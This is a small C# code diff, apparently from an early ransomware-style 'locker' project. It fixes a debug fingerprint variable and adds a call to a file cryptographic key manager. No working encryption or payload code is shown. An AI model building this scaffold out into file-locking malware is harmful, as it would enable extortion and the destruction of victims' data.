@@ -16,14 +16,16 @@ namespace s0s_L_ckr
             #if DEBUG
                         //Debug Generation
                         string fingerprint = null;
-                        CompIdStrat.StickyFingerPrinter(ref fp);
+                        CompIdStrat.StickyFingerPrinter(ref fingerprint);
 
-                        Trace.WriteLine("[+] System FingerPrint: " + fp);
-            #endif
-           
+                        Trace.WriteLine("[+] System FingerPrint: " + fingerprint);
+#endif
 
+            // Criptographic Key Manager for Files
+            CriptoKeyMgr.EnsrLocPubKey();
 
-
+            int resultVal = -1;
+            ThreadStart threadStart = null;
         }
     }
 }
